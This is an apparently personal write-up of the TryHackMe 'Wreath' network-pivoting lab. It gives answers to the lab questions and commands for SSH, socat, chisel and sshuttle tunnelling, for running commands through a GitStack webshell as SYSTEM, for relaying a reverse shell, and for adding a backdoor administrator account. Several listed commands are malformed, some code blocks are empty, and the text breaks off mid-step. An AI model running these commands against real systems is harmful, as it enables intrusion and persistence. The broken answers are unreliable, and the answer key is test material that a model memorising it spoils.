# Information

Name: Wreath

Difficulty: Easy

Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.

Note: I do not go into detail here as this is mostly guided. I do show how I arrived at each answer but I highly suggest watching the provided video guide available on TryHackMe for this network first if you find yourself lost.

## Task 1 - 4
Have no questions that require an answer.

## Task 5 - Webserver Enumeration
We always start with an nmap scan since it may take awhile to complete.

**What is the full path to this file?**

/root/.ssh/id_rsa

## Task 7

Has no question that requires an answer.

## Task 8 - Pivoting High-level Overview

**Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?**

tunnelling

SOCKS4 127.0.0.1:4242

**What command would you use to telnet through a proxy to 172.16.0.100:23?**

proxychains telnet 172.16.0.100:23

**You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?**

FP

## Task 11 - Pivoting SSH Tunnelling / Port Forwarding

**If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?**

L

**Which switch combination can be used to background an SSH port forward or tunnel?**

-fN

**It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?**

nay

**What command would you use to create a pair of throwaway SSH keys for a reverse connection?**

ssh-keygen

**If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")**

ssh -L 2222:172.16.0.100:22 kali@172.16.0.200 id_rsa -fN

**What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?**

ssh -D 8000 user@target.thm -fN

**If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.**

ssh -L 8000:172.16.0.50:80 user@127.0.0.1 -fN

## Task 12 - Pivoting plink.exe

**What tool can be used to convert OpenSSH keys into PuTTY style keys?**

puttygen

## Task 13 - Pivoting Socat

**Which socat option allows you to reuse the same listening port for more than one connection?**

reuseaddr

**If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?**

./socat tcp-1:8000 tcp:172.16.0.200:443

**What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**

./socat tcp-1:2222,fork,reuseaddr tcp:172.16.0.100:22 &

## Task 14 - Pivoting Chisel

**Use port 4242 for the listener and do not background the process.**

./chisel server -p 4242 --reverse

**What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?**

./chisel client 172.16.0.200:4242 R:socks &

**How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.**

./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

**If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?**

./chisel client 172.16.0.10:80 8000:172.16.0.5:4444

## Task 15 - Pivoting sshuttle

**How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16**

sshuttle -r pwned@172.16.20.7 172.16.0.0/16

**What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?**

--ssh-cmd "ssh -i priv_key"

**You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.**

**What switch (and argument) could you use to fix this error?**

-x 172.16.0.100

## Task 16 - Conclusion

Has no questions that require an answer.

## Task 17 - Git Server Enumeration

**Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?**

2

We exclude host .1, .250, and .200 so that leaves us two active hosts on the network, .100 and .150

**In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**

100,150

**Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?**

150

**Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**

80,3389,5985

**Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**

http

## Task 18 - Git Server Pivoting

I choose to use the suggested sshuttle for this task.

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24                                                       99 â¨¯
c : Connected to server.
client_loop: send disconnect: Broken pipe
c : fatal: ssh connection to server (pid 5003) exited with returncode 255
```

To fix the broken pipe we must add -x to exclude the ip we are connecting to since its on the same network

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24 -x 10.200.188.200                                     99 â¨¯
c : Connected to server.
```

Now we can access the page at 10.200.188.150 and we can answer the first question from this page.

**You will see that there are three publicly available exploits.**

**There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?**

43777

## Task 19 - Git Server Code Review

**Look at the information at the top of the script. On what date was this exploit written?**

18.01.2018

**Bearing this in mind, is the script written in Python2 or Python3?**

python2

**Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?**

csrftoken

## Task 20 - Git Server Exploitation

Time to try out the script!

Success and its running as NT authority\system.

**First up, let's use some basic enumeration to get to grips with the webshell:**

**What is the hostname for this target?**

git-serv

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=hostname"
"git-serv
" 
```

**What operating system is this target?**

windows

```

```

**What user is the server running as?**

nt authority\system

```â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=whoami"

```

**How many make it to the waiting listener?**

0

To proceed further we must use the ssh credentials we have from before to login and open the port we wish to use in the firewall.
First we check which ports are already open.

```
â”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# ssh -i id_rsa root@10.200.188.200
[root@prod-serv ~]# firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: eth0
  sources: 
  services: cockpit dhcpv6-client http https ssh
  ports: 10000/tcp
  protocols: 
  masquerade: no
  forward-ports: 
  source-ports: 
  icmp-blocks: 
  rich rules: 
```

And now we add a port to use.

```
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 17777/tcp
success
[root@prod-serv ~]# firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: eth0
  sources:

  ports: 10000/tcp 17777/tcp
  protocols: 
  masquerade: no
  forward-ports: 
  source-ports: 
  icmp-blocks: 
  rich rules: 
  ```
  
Next ill grab socat as suggested.
  
```
  â”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat    
```

And start a webserver on kali to transfer socat.

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# python3 -m http.server 80

```

```
â”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# ssh -i id_rsa root@10.200.188.200

Move to the tmp folder and execute socat

```

We are now connected to reverse shell from the gitstack system.

## Task 21 - Git Server Stabilisation & Post Exploitation

First we add a new admin account so we don't have to rely on the exploit.

```
PS C:\GitStack\gitphp> net user username password /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators username /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" username /add
The command completed successfully.
```

Next we access the box with evil-winrm

```
